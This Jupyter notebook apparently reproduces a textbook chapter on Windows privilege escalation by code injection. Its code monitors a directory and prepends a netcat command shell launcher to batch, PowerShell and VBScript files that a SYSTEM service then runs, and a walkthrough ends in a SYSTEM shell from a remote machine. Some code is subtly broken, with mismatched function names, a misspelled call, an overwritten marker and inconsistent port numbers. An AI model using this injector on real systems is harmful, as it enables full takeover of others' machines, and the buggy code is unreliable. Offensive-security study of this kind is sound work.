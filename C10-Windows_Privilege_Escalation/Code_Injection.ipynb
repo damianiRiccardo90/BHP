{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyN3Q40Ouhxcksjk/gDAdhVJ",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C10-Windows_Privilege_Escalation/Code_Injection.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__Code Injection__*\n",
        "\n",
        "Now that we can monitor processes and file locations, we'll automatically inject code into target files. We'll create very simple code snippets that spawn a compiled version of the __netcat.py__ tool with the privilege level of the originating service. There is a vast array of nasty things you can do with these VBScript, batch, and PowerShell files. We'll create the general framework, and you can run wild from there. Modify the __file_monitoring.py__ script and add the following code after the file modification constants:\n",
        "\n",
        "```\n",
        "NETCAT = 'c:\\\\users\\\\tim\\\\work\\\\netcat.exe'\n",
        "TGT_IP = '192.168.1.208'\n",
        "CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '\n",
        "```\n",
        "\n",
        "The code we're about to inject will use these constants: __TGT_IP__ is the IP address of the victim (the Windows box we're injeting code into) and __TGT_PORT__ is the port we'll connect to. The __NETCAT__ variable gives the location of the Netcat substitute we coded in Chapter 2. If you haven't created an executable from that code, you can do so now:\n",
        "\n",
        "```\n",
        "C:\\Users\\tim\\netcat> pyinstaller -F netcat.py\n",
        "```\n",
        "\n",
        "Then drop the resulting __netcat.exe__ file into your directory and make sure the __NETCAT__ variable points to that executable.\n",
        "\n",
        "The command our injected code will execute creates a reverse command shell:"
      ],
      "metadata": {
        "id": "Cc6pfhvt8Rk7"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "FILE_TYPES = { #[1]\n",
        "    '.bat': ['\\r\\nREM bhpmarker\\r\\n', f'\\r\\n{CMD}\\r\\n'],\n",
        "    '.ps1': ['\\r\\n#bhpmarker\\r\\n', f'\\r\\nStart-Process \"{CMD}\"\\r\\n'],\n",
        "    '.vbs': ['\\r\\n#bhpmarker\\r\\n', f'\\r\\nCreateObject(\"Wscript.Shell\").Run(\"{CMD}\")\\r\\n'],\n",
        "}\n",
        "\n",
        "def injected_code(full_filename, contents, extension):\n",
        "    if FILE_TYPES[extension][0].strip() in contents: #[2]\n",
        "        return\n",
        "\n",
        "    full_contents = FILE_TYPES[extension][0] #[3]\n",
        "    full_contents = FILE_TYPES[extension][1]\n",
        "    full_contents += contents\n",
        "    with open(full_filename, 'w') as f:\n",
        "        f.write(full_contents)\n",
        "    print('\\\\o/ Injected Code')"
      ],
      "metadata": {
        "id": "Xc8msh_0RnfN"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "We start by defining a dictionary of code snippets that match a particular file extension __[1]__. The snippet include a unique marker and the code we want to inject. The reason we use a marker is to avoid an infinite loop whereby we see a file modification, insert our code, and cause the program to detect this action as a file modification event. Left alone, this cycle would continue until the file gets gigantic and the hard drive begins to cry. Instead, the program will check for the marker and, if it finds it, know not to modify the fila a second time.\n",
        "\n",
        "Next, the __inject_code__ function handles the actual code injection and file marker checking. After we verify that the marker doesn't exist __[2]__, we write the marker and the code we want the target process to run __[3]__. Now we need to modify our main event loop to include our file extension check and the call to __inject_code__:"
      ],
      "metadata": {
        "id": "YwNiHa3-S7Up"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "#[...]\n",
        "\n",
        "                elif action == FILE_MODIFIED:\n",
        "                    extension = os.path.splittext(full_filename)[1] #[1]\n",
        "\n",
        "                if extension in FILE_TYPES: #[2]\n",
        "                    print(f'[*] Modified {full_filename}')\n",
        "                    print('[vvv] Dumping contents ...')\n",
        "                    try:\n",
        "                        with open(full_filename) as f:\n",
        "                            contents = f.read()\n",
        "                        # NEW CODE\n",
        "                        inject_code(full_filename, contents, extension)\n",
        "                        print(contents)\n",
        "                        print('[^^^] Dump complete.')\n",
        "                    except Exception as e:\n",
        "                        print(f'[!!!] Dump failed. {e}')\n",
        "\n",
        "#[...]"
      ],
      "metadata": {
        "id": "Pq4cagg3T-0_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "This is a pretty straighforward addition to the primary loop. We do a quick split of the file extension __[1]__ and then check it against our dictionary of known file types __[2]__. If the file extension is detected in the dictionary, we call the __inject_code__ function. Let's take it for a spin."
      ],
      "metadata": {
        "id": "-xXO9p1KT-J9"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Kicking the Tires__*\n",
        "\n",
        "If you installed the __bhservice__ at the beginning of this chapter, you can easily test your fancy new code injector. Make sure the service is running and then execute your __file_monitor.py__ script. Eventually, you should see output indicating that a __.vbs__ file has been created and modified and that code has been injected. In the following example, we've commented out the printing of the contents to save space:\n",
        "\n",
        "```\n",
        "[*] Modified c:\\Windows\\Temp\\bhservice_task.vbs\n",
        "[vvv] Domping contents ...\n",
        "\\o/ Injected Code\n",
        "[^^^] Dump complete.\n",
        "```\n",
        "\n",
        "If you open a new cmd window, you should see that the target port is open:\n",
        "\n",
        "```\n",
        "c:\\Users\\tim\\work> netstat -an |findstr 999\n",
        "  TCP    192.168.1.208:999      0.0.0.0:0       LISTENING\n",
        "```\n",
        "\n",
        "If all went well, you can use the __nc__ command or run the __netcat.py__ script from Chapter 2 to connect the listener you just spawned. To make sure your privilege escalation worked, connect to the listener from your Kali machine and check which user you're running as:\n",
        "\n",
        "```\n",
        "$ nc -nv 192.168.1.208 9999\n",
        "Connection to 192.168.1.208 port 9999 [tcp/*] succeeded!\n",
        "#> whoami\n",
        "nt authority\\system\n",
        "#> exit\n",
        "```\n",
        "\n",
        "This should indicate that you've obtained the privileges of the holy SYSTEM account. Your code injection worked.\n",
        "\n",
        "You may have reached the end of this chapter thinking that some of these attacks are a bit esoteric. But if you spend enough time inside a large enterprise, you'll realize these tactics are quite viable. You can easily expand the tooling in this chapter, or turn it into specialty scripts to compromise a local account or application. WMI alone can be an excellent source of local recon data; it can enable you to further an attack once you're inside a network. Privilege escalation is an essential piece to any good trojan."
      ],
      "metadata": {
        "id": "AdRWHE8FVB0c"
      }
    }
  ]
}